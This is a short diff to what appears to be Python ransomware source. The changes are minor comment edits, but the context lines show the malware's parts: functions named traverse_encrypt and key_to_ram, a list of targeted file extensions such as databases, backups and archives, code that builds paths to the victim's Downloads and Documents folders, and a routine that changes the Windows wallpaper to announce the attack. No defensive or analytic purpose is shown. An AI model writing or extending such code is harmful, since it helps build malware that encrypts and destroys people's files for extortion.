@@ -192,7 +192,7 @@ def traverse_encrypt(drive, key):
                   '.mov', '.zip', '.rar', '.7z', '.tar', '.sql', '.mdb', '.accdb', '.bak', '.iso', '.tar.gz', '.gz', '.sqlite', '.xml', '.json', '.csv')
     
     def get_main_dirs(username, drive):
-        # Construct dynamic destructuve path
+        # Construct dynamic destructive path
         main_dirs = [
             os.path.join(drive, f"Users\\{username}\\Downloads"),
             os.path.join(drive, f"Users\\{username}\\Documents"),
@@ -257,7 +257,7 @@ def key_to_ram(key):
 
     return mm, key_len, kernel32
 
-# Change the wallpaper of the user to indicate an attack
+# Change the wallpaper of the user to indicate an attack (not tested!)
 def change_windows_wallpaper():
     wallpaper_path = os.path.join(os.getcwd(), 'wallpaperX324HF.png')
     SPI_SETDESKWALLPAPER = 0x0014
@@ -272,6 +272,7 @@ def change_windows_wallpaper():
         # Apply changes
         ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, wallpaper_path, 3)
     except:
+        # Dont do anything if the above fails just in case
         return
 
 # Zero out the memory and unlock memory again
